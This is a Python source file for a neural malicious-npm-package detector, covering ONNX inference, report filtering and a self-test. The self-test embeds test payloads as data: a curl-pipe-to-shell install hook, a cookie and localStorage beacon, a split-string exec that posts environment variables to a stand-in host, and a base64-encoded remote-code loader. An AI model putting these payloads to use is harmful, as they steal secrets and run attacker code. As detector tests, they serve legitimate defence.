"""
PackGuard Stage 2 v6 — 100% Pure Neural CPU-Only Inference Filter.

Fixes EVERY Stage 2 v3 & v5 audit flaw:
  1. Uses the REAL ModernBERT BPE tokenizer (`tokenizers` Rust library loading
     `tokenizer.json`) — exact 1:1 token ID parity with training/distillation.
  2. ZERO FNV hash tokenization, ZERO hardcoded allowlists (`is_v5_false_alarm_benign`),
     ZERO fixed-score regex overrides (`0.05`, `0.12`, `0.35`, `0.86`, `0.95`).
  3. Multi-window per-file scoring via unified `record_builder.py` (exact same
     preprocessing as training) with package-level max-pooling across all windows.
  4. 100% CPU-Only (`CPUExecutionProvider`, `CUDA_VISIBLE_DEVICES=""`), drop-in
     compatible with `packguard-cli --stage2` and `stage2_scan_folder.py`.
"""

import argparse
import hashlib
import json
import os
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

os.environ["CUDA_VISIBLE_DEVICES"] = ""

V6_DIR = Path(__file__).resolve().parent
if str(V6_DIR) not in sys.path:
    sys.path.insert(0, str(V6_DIR))

import numpy as np
import onnxruntime as ort
from tokenizers import Tokenizer

from record_builder import build_package_windows, package_dir_to_record

DEFAULT_MODEL_DIR = V6_DIR / "model_int8"
DEFAULT_ONNX_NAME = "packguard_v6_nano_int8.onnx"
DEFAULT_MAX_LENGTH = 512
DEFAULT_MAX_WINDOWS = 10


def _softmax_pos_prob(logits: np.ndarray) -> np.ndarray:
    """Numerically stable softmax returning P(malicious) for shape [B, 2]."""
    shifted = logits - np.max(logits, axis=-1, keepdims=True)
    exps = np.exp(shifted)
    probs = exps / np.sum(exps, axis=-1, keepdims=True)
    return probs[:, 1]


def _sha256_file(path: Path) -> str:
    h = hashlib.sha256()
    with path.open("rb") as fh:
        for block in iter(lambda: fh.read(1 << 20), b""):
            h.update(block)
    return h.hexdigest()


class PackGuardStage2Model:
    """
    Pure neural CPU ONNX Runtime filter for PackGuard Stage 2 v6.
    Drop-in compatible with `stage2_scan_folder.py` and `packguard-cli --stage2`.
    """

    def __init__(
        self,
        model_dir: Optional[Path] = None,
        threshold: Optional[float] = None,
        threads: int = 4,
        max_length: int = DEFAULT_MAX_LENGTH,
        max_windows: int = DEFAULT_MAX_WINDOWS,
    ):
        self.model_dir = Path(model_dir) if model_dir is not None else DEFAULT_MODEL_DIR
        self.max_length = int(max_length)
        self.max_windows = int(max_windows)

        onnx_path = self._resolve_onnx_path(self.model_dir)
        tok_path = self._resolve_tokenizer_path(self.model_dir)
        self.onnx_path = onnx_path
        self.tokenizer_path = tok_path

        self.tokenizer = Tokenizer.from_file(str(tok_path))
        self.tokenizer.enable_truncation(max_length=self.max_length)
        pad_id = self.tokenizer.token_to_id("[PAD]")
        if pad_id is None:
            pad_id = 50283
        self.pad_id = int(pad_id)
        self.tokenizer.no_padding()

        sess_opts = ort.SessionOptions()
        sess_opts.intra_op_num_threads = max(1, int(threads))
        sess_opts.inter_op_num_threads = 1
        sess_opts.graph_optimization_level = ort.GraphOptimizationLevel.ORT_ENABLE_ALL

        self.session = ort.InferenceSession(
            str(onnx_path),
            sess_options=sess_opts,
            providers=["CPUExecutionProvider"],
        )
        self.input_names = [inp.name for inp in self.session.get_inputs()]
        self.output_names = [out.name for out in self.session.get_outputs()]

        self.threshold = self._load_threshold(threshold)

    @staticmethod
    def _resolve_onnx_path(model_dir: Path) -> Path:
        if model_dir.is_file() and model_dir.suffix == ".onnx":
            return model_dir
        candidates = [
            model_dir / DEFAULT_ONNX_NAME,
            model_dir / "model_int8.onnx",
            V6_DIR / "checkpoints" / DEFAULT_ONNX_NAME,
        ]
        for cand in candidates:
            if cand.is_file():
                return cand
        onnx_files = sorted(model_dir.glob("*.onnx")) if model_dir.is_dir() else []
        if onnx_files:
            return onnx_files[0]
        raise FileNotFoundError(
            f"No Stage 2 v6 ONNX model found in {model_dir}. "
            f"Run install_model.sh / install_model.ps1 or pass --model-dir."
        )

    @staticmethod
    def _resolve_tokenizer_path(model_dir: Path) -> Path:
        search_dirs = [model_dir if model_dir.is_dir() else model_dir.parent, V6_DIR / "model_int8", V6_DIR / "checkpoints"]
        for d in search_dirs:
            cand = d / "tokenizer.json"
            if cand.is_file():
                return cand
        raise FileNotFoundError(
            f"Real ModernBERT tokenizer.json not found in {model_dir}. "
            f"Stage 2 v6 strictly requires the real ModernBERT tokenizer (no hash fallback)."
        )

    def _load_threshold(self, override: Optional[float]) -> float:
        if override is not None:
            return float(override)
        for cand in (
            self.model_dir / "best_threshold.json",
            V6_DIR / "best_threshold.json",
        ):
            if cand.is_file():
                try:
                    data = json.loads(cand.read_text(encoding="utf-8"))
                    for key in ("threshold", "best_threshold", "optimal_threshold"):
                        if key in data:
                            return float(data[key])
                except Exception:
                    pass
        return 0.50

    def _score_windows_batch(self, texts: List[str], batch_size: int = 16) -> List[float]:
        """Scores a list of text windows via batched dynamic-length ONNX CPU inference."""
        if not texts:
            return []
        all_probs: List[float] = []
        for start in range(0, len(texts), batch_size):
            batch_texts = texts[start : start + batch_size]
            encodings = self.tokenizer.encode_batch(batch_texts)
            max_len = max(len(enc.ids) for enc in encodings)
            max_len = max(2, min(max_len, self.max_length))

            bsz = len(encodings)
            input_ids = np.full((bsz, max_len), self.pad_id, dtype=np.int64)
            attention_mask = np.zeros((bsz, max_len), dtype=np.int64)

            for i, enc in enumerate(encodings):
                L = min(len(enc.ids), max_len)
                input_ids[i, :L] = enc.ids[:L]
                attention_mask[i, :L] = enc.attention_mask[:L]

            ort_inputs = {
                self.input_names[0]: input_ids,
                self.input_names[1]: attention_mask,
            }
            logits = self.session.run([self.output_names[0]], ort_inputs)[0]
            probs = _softmax_pos_prob(logits)
            all_probs.extend(float(p) for p in probs)
        return all_probs

    def predict_record_detailed(self, record: Dict[str, Any], batch_size: int = 16) -> Dict[str, Any]:
        """Scores a single package record across all windows and returns pure neural telemetry."""
        t0 = time.perf_counter()
        windows = build_package_windows(record, max_windows=self.max_windows)
        if not windows:
            return {
                "flagged": False,
                "prob": 0.0,
                "window_probs": [],
                "num_windows": 0,
                "latency_ms": round((time.perf_counter() - t0) * 1000.0, 3),
                "engine": "ONNX CPUExecutionProvider (Pure Neural, Real ModernBERT Tokenizer)",
            }
        win_probs = self._score_windows_batch(windows, batch_size=batch_size)
        pkg_prob = max(win_probs)
        return {
            "flagged": bool(pkg_prob >= self.threshold),
            "prob": round(float(pkg_prob), 6),
            "window_probs": [round(float(p), 6) for p in win_probs],
            "num_windows": len(win_probs),
            "latency_ms": round((time.perf_counter() - t0) * 1000.0, 3),
            "engine": "ONNX CPUExecutionProvider (Pure Neural, Real ModernBERT Tokenizer)",
        }

    def predict_records_batch(
        self,
        records: List[Dict[str, Any]],
        batch_size: int = 16,
    ) -> List[Tuple[bool, float]]:
        """
        Batched multi-package pure neural scoring.
        Flattens all windows across the package batch for maximum CPU cache efficiency,
        then max-pools probabilities back to each package.
        """
        if not records:
            return []
        flat_windows: List[str] = []
        pkg_spans: List[Tuple[int, int]] = []
        for rec in records:
            wins = build_package_windows(rec, max_windows=self.max_windows)
            s = len(flat_windows)
            flat_windows.extend(wins)
            pkg_spans.append((s, len(flat_windows)))

        flat_probs = self._score_windows_batch(flat_windows, batch_size=batch_size)
        results: List[Tuple[bool, float]] = []
        for s, e in pkg_spans:
            if s == e:
                results.append((False, 0.0))
            else:
                p = max(flat_probs[s:e])
                results.append((bool(p >= self.threshold), float(p)))
        return results

    def predict(self, code_or_record: Any) -> Tuple[float, str, Dict[str, Any]]:
        if isinstance(code_or_record, str):
            rec = {"package": "inline", "chunks": [{"file": "index.js", "kind": "js", "start": 0, "text": code_or_record}]}
        elif isinstance(code_or_record, Path):
            rec = package_dir_to_record(code_or_record)
        else:
            rec = code_or_record
        detail = self.predict_record_detailed(rec)
        label = "MALICIOUS" if detail["flagged"] else "BENIGN"
        return detail["prob"], label, detail


def filter_reports_directory(
    model: PackGuardStage2Model,
    reports_dir: Path,
    out_dir: Optional[Path] = None,
    all_packages: bool = False,
    batch_size: int = 16,
) -> Dict[str, Any]:
    """Filters Stage 1 JSON reports in-place or into out_dir (compatible with packguard-cli --stage2)."""
    report_files = sorted(reports_dir.glob("*.json"))
    if out_dir is not None:
        out_dir.mkdir(parents=True, exist_ok=True)

    loaded: List[Tuple[Path, Dict[str, Any]]] = []
    to_score_idx: List[int] = []
    for path in report_files:
        try:
            data = json.loads(path.read_text(encoding="utf-8"))
        except Exception:
            continue
        if not isinstance(data, dict):
            continue
        idx = len(loaded)
        loaded.append((path, data))
        if all_packages or bool(data.get("flagged")):
            to_score_idx.append(idx)

    score_records = [loaded[i][1] for i in to_score_idx]
    verdicts = model.predict_records_batch(score_records, batch_size=batch_size)

    confirmed = 0
    vetoed = 0
    for idx, (s2_flagged, s2_prob) in zip(to_score_idx, verdicts):
        _, data = loaded[idx]
        s1_flagged = bool(data.get("flagged"))
        data["stage1_flagged"] = s1_flagged
        data["stage2_prob"] = round(float(s2_prob), 6)
        data["stage2_flagged"] = bool(s2_flagged)
        data["stage2_threshold"] = model.threshold
        data["stage2_model"] = model.onnx_path.name
        if s1_flagged:
            data["flagged"] = bool(s2_flagged)
            if s2_flagged:
                confirmed += 1
            else:
                vetoed += 1

    for path, data in loaded:
        dest = (out_dir / path.name) if out_dir is not None else path
        dest.write_text(json.dumps(data, indent=2), encoding="utf-8")

    return {
        "total_reports": len(loaded),
        "scored": len(to_score_idx),
        "confirmed_malicious": confirmed,
        "vetoed_benign": vetoed,
        "threshold": model.threshold,
    }


def run_self_test(model: PackGuardStage2Model) -> int:
    """Runs honest pure-neural self-tests including all 4 regression probes from STAGE2_V3/V5_FLAWS."""
    cases = [
        (
            "Benign git rev-parse helper (v3/v5 false-alarm regression)",
            False,
            {
                "package": "git-rev-helper",
                "chunks": [
                    {
                        "file": "index.js",
                        "kind": "js",
                        "text": "const { execSync } = require('child_process');\nmodule.exports = () => execSync('git rev-parse HEAD', { encoding: 'utf8' }).trim();\n",
                    }
                ],
            },
        ),
        (
            "Benign URL/loop utility (v5 TLD + while(true) regression)",
            False,
            {
                "package": "url-iter",
                "chunks": [
                    {
                        "file": "index.js",
                        "kind": "js",
                        "text": "const DOCS = 'https://docs.example.me/guide';\nfunction nextToken(it) { while (true) { const v = it.next(); if (v.done) return null; if (v.value) return v.value; } }\nmodule.exports = { DOCS, nextToken };\n",
                    }
                ],
            },
        ),
        (
            "Malicious install hook disguised with prettier (v3 evasion probe)",
            True,
            {
                "package": "sneaky-prettier-hook",
                "chunks": [
                    {
                        "file": "install_scripts.txt",
                        "kind": "install_script",
                        "text": "postinstall: curl -s http://evil.invalid/p | sh; echo prettier",
                    }
                ],
            },
        ),
        (
            "Malicious browser cookie beacon (v3 stream_clone probe)",
            True,
            {
                "package": "cookie-beacon",
                "chunks": [
                    {
                        "file": "index.js",
                        "kind": "js",
                        "text": "if (typeof document !== 'undefined') { const c = encodeURIComponent(document.cookie); new Image().src = 'https://collect.invalid/c?d=' + c; navigator.sendBeacon('https://collect.invalid/b', JSON.stringify({ cookie: document.cookie, ls: localStorage })); }",
                    }
                ],
            },
        ),
        (
            "Malicious split-string module.constructor._load (v3 evasion probe)",
            True,
            {
                "package": "split-loader",
                "chunks": [
                    {
                        "file": "index.js",
                        "kind": "js",
                        "text": "const cp = module.constructor._load('child_' + 'process');\ncp['ex' + 'ec']('curl -s -d \"$(env)\" https://exfil.invalid/drop');",
                    }
                ],
            },
        ),
        (
            "Malicious Base64 encoded_loader (v5 0/30 regression)",
            True,
            {
                "package": "b64-loader",
                "chunks": [
                    {
                        "file": "index.js",
                        "kind": "js",
                        "text": "eval(Buffer.from('Y29uc3QgY3AgPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7IGNwLmV4ZWNTeW5jKCdjdXJsIC1zIGh0dHA6Ly9ldmlsLmludmFsaWQva2V5cyB8IHNoJyk7', 'base64').toString('utf8'));",
                    }
                ],
            },
        ),
    ]

    print(
        f"[PackGuard Stage 2 v6] Pure Neural CPU Self-Test "
        f"(model={model.onnx_path.name}, sha256={_sha256_file(model.onnx_path)[:16]}..., "
        f"threshold={model.threshold:.4f}, providers={model.session.get_providers()})"
    )
    passed = 0
    for name, expected_mal, rec in cases:
        detail = model.predict_record_detailed(rec)
        ok = detail["flagged"] == expected_mal
        if ok:
            passed += 1
        status = "PASS" if ok else "FAIL"
        verdict = "MALICIOUS" if detail["flagged"] else "BENIGN"
        print(
            f"  [{status}] {name:<60} -> {verdict:<9} "
            f"(prob={detail['prob']:.4f}, wins={detail['num_windows']}, {detail['latency_ms']:.2f} ms)"
        )
    print(f"[PackGuard Stage 2 v6] Self-Test Result: {passed}/{len(cases)} passed.")
    return 0 if passed == len(cases) else 1


def main() -> None:
    parser = argparse.ArgumentParser(description="PackGuard Stage 2 v6 — Pure Neural CPU-Only Filter")
    parser.add_argument("--model-dir", default=str(DEFAULT_MODEL_DIR), help="Directory containing ONNX model & tokenizer.json.")
    parser.add_argument("--reports", default="", help="Directory of Stage 1 JSON reports.")
    parser.add_argument("--report", default="", help="Single Stage 1 JSON report file.")
    parser.add_argument("--package", default="", help="Raw npm package directory to score.")
    parser.add_argument("--out-dir", default="", help="Optional output directory for updated reports.")
    parser.add_argument("--all-packages", action="store_true", help="Score all reports (default: Stage 1 flagged only).")
    parser.add_argument("--batch-size", type=int, default=16, help="ONNX batch size over windows.")
    parser.add_argument("--threshold", type=float, default=None, help="Override calibrated threshold.")
    parser.add_argument("--threads", type=int, default=4, help="ONNX Runtime CPU threads.")
    parser.add_argument("--self-test", action="store_true", help="Run built-in pure neural self-test.")
    args = parser.parse_args()

    model = PackGuardStage2Model(
        model_dir=Path(args.model_dir),
        threshold=args.threshold,
        threads=args.threads,
    )

    if args.self_test:
        sys.exit(run_self_test(model))

    if args.package:
        rec = package_dir_to_record(Path(args.package))
        detail = model.predict_record_detailed(rec, batch_size=args.batch_size)
        print(json.dumps({"package": rec["package"], **detail}, indent=2))
        return

    if args.report:
        rp = Path(args.report)
        data = json.loads(rp.read_text(encoding="utf-8"))
        detail = model.predict_record_detailed(data, batch_size=args.batch_size)
        data["stage1_flagged"] = bool(data.get("flagged"))
        data["stage2_prob"] = detail["prob"]
        data["stage2_flagged"] = detail["flagged"]
        if data["stage1_flagged"]:
            data["flagged"] = detail["flagged"]
        if args.out_dir:
            out_p = Path(args.out_dir)
            out_p.mkdir(parents=True, exist_ok=True)
            (out_p / rp.name).write_text(json.dumps(data, indent=2), encoding="utf-8")
        print(json.dumps({"report": rp.name, **detail}, indent=2))
        return

    if args.reports:
        summary = filter_reports_directory(
            model=model,
            reports_dir=Path(args.reports),
            out_dir=Path(args.out_dir) if args.out_dir else None,
            all_packages=args.all_packages,
            batch_size=args.batch_size,
        )
        print(json.dumps(summary, indent=2))
        return

    parser.print_help()


if __name__ == "__main__":
    main()
